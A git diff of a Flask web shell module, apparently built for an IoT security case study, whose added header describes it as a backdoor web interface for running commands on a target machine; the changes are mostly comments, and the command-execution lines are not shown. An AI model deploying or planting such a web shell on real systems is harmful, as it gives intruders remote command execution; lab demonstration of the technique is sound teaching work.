@@ -1,9 +1,27 @@
-# The all in one version of the flask web shell which remove all the comments 
+#-----------------------------------------------------------------------------
+# Name:        flaskWebShellApp.py
+#
+# Purpose:     This module is a flask web host used to create a web shell script 
+#              which can open a backdoor web interface for the user to run command 
+#              on the target machine. Used to demo the web shell remote command 
+#              execution vulnerability in IoT case study.
+#
+# Author:      Yuancheng Liu
+#
+# Version:     v_0.0.2
+# Created:     2024/07/10
+# Copyright:   Copyright (c) 2023 LiuYuancheng
+# License:     MIT License
+#-----------------------------------------------------------------------------
+
 import subprocess
 from flask import Flask, request
 from flask_socketio import SocketIO, emit # pip install Flask-SocketIO==5.3.5
+
+# Set the port you want to open.
 gflaskPort = 5001
 
+# Create flask web host with the socketio for the real time result update.
 HTML_CONTENT = """<!doctype html>
 <html>
     <head>
@@ -43,7 +61,7 @@ HTML_CONTENT = """<!doctype html>
                 });
                 var socket = io();
                 socket.on('connect', function () {
-                    socket.emit('cli_request', { data:  'connected!' });
+                    socket.emit('cli_request', { data: 'connected!' });
                 });
                 socket.on('exeResult', function (msg) {
                     console.log(msg.data);
@@ -58,9 +76,10 @@ HTML_CONTENT = """<!doctype html>
 app = Flask(__name__)
 socketio = SocketIO(app)
 
+#-----------------------------------------------------------------------------
 @app.route('/')
 def index():
-    """ route to introduction index page."""
+    """ route to web shell page."""
     return HTML_CONTENT
 
 @app.route('/cmdsubmit', methods=['POST','GET'])
@@ -78,7 +97,9 @@ def cmdsubmit():
 
 @socketio.event
 def connect():
-    emit('serv_response', {'data': 'web shell ready'})
+    emit('serv_response', {'data': 'Flask web shell ready'})
 
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=gflaskPort, debug=False, threaded=True)
